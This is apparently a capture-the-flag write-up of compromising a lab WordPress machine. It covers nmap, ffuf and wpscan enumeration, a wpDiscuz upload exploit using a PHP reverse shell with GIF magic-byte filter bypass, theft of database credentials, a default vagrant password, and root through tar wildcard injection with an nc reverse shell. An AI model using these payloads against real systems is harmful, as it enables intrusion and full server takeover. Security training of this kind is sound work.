
sepi0l | January 1 | 2024 

## Enumeration: 

### Nmap

```bash 
$IP=192.168.179.217
mkdir nmap
nmap -sC -sV -T3 -vvv -oN nmap/inital $IP
nmap -p- -vvv -oN nmap/all_ports $IP
```

#### Output: 
```bash
# Nmap 7.94 scan initiated Tue Jan  2 15:44:02 2024 as: nmap -sC -sV -T3 -vvv -oN nmap/inital 192.168.179.217
Nmap scan report for 192.168.179.217
Host is up, received syn-ack (0.30s latency).
Scanned at 2024-01-02 15:44:02 IST for 79s
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 95:1d:82:8f:5e:de:9a:00:a8:07:39:bd:ac:ad:d3:44 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxOfkU+Q4dfPLCyiHlcl3+Rl8fCPL9YJ7GzzYAG8Vl75YbD21HXms6zE8KDBFuMu34+hvYCGxHIZVtZRMf9MFHdamqdx4YC++ZU7EFYy4eSQjPSukpIZOz4S4md5AmMFNucvvVOq9XVhWnxy86WSZzLO62y7ygqjG6w3sIXlrOjalqCUVgD60wnk53PW6Etkr6kpJwtrBXl60I6LOrb8hmTO63copeWbcYwi4OhlYAKV9EJjAFl9OohQX7uTR7uzoYPwaztG2HGQw/LQEQeV6KAfL+cb5QQMnP3ZW3r/nMKKZW3zw5h20sVaeoNcgVZ9ANv3EvldJqrRRG/R1wYJHV
|   256 d7:b4:52:a2:c8:fa:b7:0e:d1:a8:d0:70:cd:6b:36:90 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE6ost/PYmYfXkZxdW+XZSdvrXfTYifdCxxeASUc4llXCR9sRC0lxNP0AnjWlQq+xnAg95xDHNYSsNoPDaaqgHE=
|   256 df:f2:4f:77:33:44:d5:93:d7:79:17:45:5a:a1:36:8b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICNUmat0TujFtlTGYNCBEuh1P+MbsML6IJihp6I7mERS
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Blogger | Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /opt/homebrew/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jan  2 15:45:21 2024 -- 1 IP address (1 host up) scanned in 79.49 seconds

```

### Ffuf:

Port 80 has a website running. It is running on apache version 2.4.18.  Let's fuzz the  directories using ffuf. 
```bash
ffuf -u http://192.168.179.217/FUZZ -w /opt/wordlists/wordlist.txt -mc all -fc 404
```

#### Output: 

```bash

images
[Status: 301, Size: 319, Words: 20, Lines: 10,Duration: 249ms]

assets 
[Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 251ms]

css
[Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 244ms]

js 
[Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 230ms]

```


### Website: 

We have four directories here. `assets` looks interesting. Let's check it out. 

![[Pasted image 20240102160143.png]]

The directory contains some font files and a directory called `blogs`. Let's check out what is in blogs.

![[Pasted image 20240102160440.png]]

Looks like we have a hostname `blogger.thm` . Let's add it in our `/etc/hosts` file.

![[Pasted image 20240102160620.png]]

Let's try accessing the `blog` endpoint again.

Looks like we have a wordpress site here. 

![[Pasted image 20240102160802.png]]


Since it is a wordpress site, we can use a tool called `wpscan` to gather information about the site.

##### Wpscan:

Let's enumerate potential users first. 
```bash
wpscan --url blogger.thm/assets/fonts/blog --enumerate u 
```

##### Output:
```bash
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` |  _ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[32m[+][0m URL: http://blogger.thm/assets/fonts/blog/ [192.168.179.217]
[32m[+][0m Started: Tue Jan  2 17:05:46 2024

Interesting Finding(s):

[32m[+][0m Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[32m[+][0m XML-RPC seems to be enabled: http://blogger.thm/assets/fonts/blog/xmlrpc.php
 | Found By: Link Tag (Passive Detection)
 | Confidence: 100%
 | Confirmed By: Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[32m[+][0m WordPress readme found: http://blogger.thm/assets/fonts/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[32m[+][0m Upload directory has listing enabled: http://blogger.thm/assets/fonts/blog/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[32m[+][0m The external WP-Cron seems to be enabled: http://blogger.thm/assets/fonts/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[32m[+][0m WordPress version 4.9.8 identified (Insecure, released on 2018-08-02).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blogger.thm/assets/fonts/blog/?feed=rss2, <generator>https://wordpress.org/?v=4.9.8</generator>
 |  - http://blogger.thm/assets/fonts/blog/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.9.8</generator>

[32m[+][0m WordPress theme in use: poseidon
 | Location: http://blogger.thm/assets/fonts/blog/wp-content/themes/poseidon/
 | Last Updated: 2022-10-20T00:00:00.000Z
 | Readme: http://blogger.thm/assets/fonts/blog/wp-content/themes/poseidon/readme.txt
 | [33m[!][0m The version is out of date, the latest version is 2.3.9
 | Style URL: http://blogger.thm/assets/fonts/blog/wp-content/themes/poseidon/style.css?ver=2.1.1
 | Style Name: Poseidon
 | Style URI: https://themezee.com/themes/poseidon/
 | Description: Poseidon is an elegant designed WordPress theme featuring a splendid fullscreen image slideshow. The...
 | Author: ThemeZee
 | Author URI: https://themezee.com
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blogger.thm/assets/fonts/blog/wp-content/themes/poseidon/style.css?ver=2.1.1, Match: Version: 2.1.1

[32m[+][0m Enumerating Users (via Passive and Aggressive Methods)

 Brute Forcing Author IDs -: |===========================================================================================================================|

[34m[i][0m User(s) Identified:

[32m[+][0m j@m3s
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Login Error Messages (Aggressive Detection)

[32m[+][0m jm3s
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[33m[!][0m No WPScan API Token given, as a result vulnerability data has not been output.
[33m[!][0m You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[32m[+][0m Finished: Tue Jan  2 17:05:52 2024
[32m[+][0m Requests Done: 14
[32m[+][0m Cached Requests: 46
[32m[+][0m Data Sent: 4.115 KB
[32m[+][0m Data Received: 11.324 KB
[32m[+][0m Memory used: 246.984 MB
[32m[+][0m Elapsed time: 00:00:05

```

We have two users: `j@m3s` and `jm3s`. We can try to bruteforce their passwords.

Let's now detect if any vulnerable plugins are running on the target 
```bash
wpscan --api-token=$TOKEN --url blogger.thm/assets/fonts/blog --plugins-detection mixed
```
##### Output:
 ![[Pasted image 20240102171718.png]]

As we can see, The site has a plugin `wpDiscuz` which is vulnerable to unauthenticated file upload.

## Initial Access : 

Let's google how we can exploit this.  

[[https://ine.com/blog/vulnerability-lab-wordpress-plugin-wpdiscuz-unauthenticated-rce]] has a description about the vulnerability and how it can be exploited.

![[Pasted image 20240102172132.png]]

It looks like we can upload an image along with our comments on a blogpost. We can use this upload functionality to upload a reverse shell. 

We have created a file named `shell.php` with the following payload as its contents:
```bash
<?php system('bash -c "bash -i >& /dev/tcp/192.168.45.184/9001 0>&1"'); ?>

```

Let's try uploading it .

Looks like .php files are not allowed. Let's change the Content-Type to `image/jpeg` using burp.
![[Pasted image 20240102173617.png]]

**Response:** 

![[Pasted image 20240102173703.png]]

It still says not allowed file type.

It seems the server is using magic bytes to determine the filetype of the uploaded file. Magic bytes are special bytes which allow a linux system to determine their filetype. Let's try adding magic bytes at the beginning of our files.   Here, we can add the magic bytes of GIF file to the starting of our `shell.php`.

The magic bytes for a GIF file is : `GIF89n;`
![[Pasted image 20240102174058.png]]

Let's try uploading our shell again.

**Response : 

![[Pasted image 20240102174212.png]]

It looks like our shell has been uploaded to `/wp-content/uploads/2024/01`. Let's try accessing it and check if we can get a shell.

```bash
curl http://blogger.thm/assets/fonts/blog/wp-content/uploads/2024/01/shell-1704197508.7293.php
```

![[Pasted image 20240102174454.png]]

And we are in!!!!

## Privilege Escalation: 

First of all, let's spawn a tty:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```
Looking around , we find  `wp-config.php` file within the `/var/www/wordpress/assets/fonts/blog` which contains the creds for the database.

```
db_username: root
db_password : sup3r_s3cr3t
```


Let's try logging into the mysql database using the following command :
```bash
mysql -u root -p -h localhost 
```

We get logged in . Now let's list the databases :

```MySQL
show databases;
```

![[Pasted image 20240102181415.png]]

Let's get into the wordpress database and list the tables : 
```MySQL
SHOW tables;
```

![[Pasted image 20240102181524.png]]

The Table `wp_users` seems interesting. Let's see what entries it contains :

```MySQL
describe wp_users;
```

![[Pasted image 20240102181623.png]]

Cool! Let's extract out  the usernames and passwords from the table :
```SQL
SELECT user_login,user_pass FROM wp_users;
```

![[Pasted image 20240102181838.png]]

Here we have the username and the hashed password for the `j@m3s` user.
Let's see if we can crack the hash using hashcat

The hash doesn't seem  crackable. We have hit a roadblock ☹️.
Let's try finding interesting SUID binaries :
```bash
find / -type f -perm 4000 2>/dev/null
```

Output :

![[Pasted image 20240102182908.png]]

No binary seems interesting. Let's take a look at the crontabs running.

```bash
cat /etc/crontab
```

Output: 

![[Pasted image 20240102183011.png]]

We have a crontab running as root. Let's check what the backup.sh script contains

```bash
#!/bin/sh 
cd /home/james/
tar czf /tmp/backup.tar.gz *

```
It looks like the script attempts to create a tar backup of all the contents of `/home/james/` to a file named `backup.tar.gz`  within the `/tmp` directory.

The script could be vulnerable to a `WildCard Injection[]`(https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/) Attack which is a technique of privilege escalation. But to perform this attack, we need to be able to write within the `/home/james` directory but we cannot. 

Let's check what more users we have on the system :

```
ubuntu
vagrant
```

The `vagrant` user often has the password `vagrant` if not changed. Let's see if we can login as `vagrant` using the password `vagrant`
```bash
su vagrant
password: vagrant
vagrant@ubuntu-xenial:/home$
```
There we go, we are now logged in as the vagrant user.

Let's check what commands  we can run as sudo :
```bash
sudo -l
```

Output:
```bash
(ALL) NOPASSWD: ALL
```

We can execute any command as any user without authentication.

Here, we can simply run the following command to get root :
```bash
sudo -u root bash
```
But that would be no fun.  Let's escalate our privileges the hard way cause that's what 1337 hax0rs do!!! 😉

Let's spawn a shell as the `james` user :
```bash
sudo -u james bash
```

### WildCard Injection :

Done. Now let's make a `shell.sh` file and put in the following reverse shell in it : 
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.184 9001 >/tmp/f
```

`tar` has two options which we can abuse here to run our malicious file `shell.sh` as root.
The options are : 
`1. --checkpoint=`
`2. --checkpoint-action=`

a `checkpoint` in the context of a tar archive is like a bookmark or a save point. When you create a tar archive , you might want to pause the process and resume it later. A checkpoint helps you do that by marking a specific point in the archive creation process. If something goes wrong or you need to stop and continue later, you can start from the checkpoint instead of beginning the entire archiving process again. It's a way to save progress and pick up where you left off.

`Checkpoint-action` executes an action at each checkpoint.
(For more information: https://www.gnu.org/software/tar/manual/html_section/checkpoints.html#:~:text=A%20checkpoint%20is%20a%20moment,%27%20%2D%2Dcheckpoint%5B%3D%20n%20%5D%20%27)

 i.e if we set the `checkpoint` value to 1 and `checkpoint-action` to `echo test`, Tar will execute `echo test` as soon the checkpoint value is `1`.

So, how can we abuse this as ?

We can create an empty  file named `--checkpoint=1` using :
```bash
echo "" > "--checkpoint=1"
```

And then create another file named `--checkpoint-action=exech=sh shell.sh` using :

```bash
echo "" > "--checkpoint-action=exec=sh shell.sh"
```

These two files will act as arguments for tar. As  a result, when the crontab runs as root , tar will set the checkpoint value to 1 and when the checkpoint value becomes one, it will run the checkpoint action , running our malicious file as root which will send us a reverse shell as root.

Let's now start the listener and wait for the connection to come through.


![[Pasted image 20240102192724.png]]

And!! we are root.  We have owned the machine.

Thanks for reading, see you in the next one :).
Regards,
sepi0l.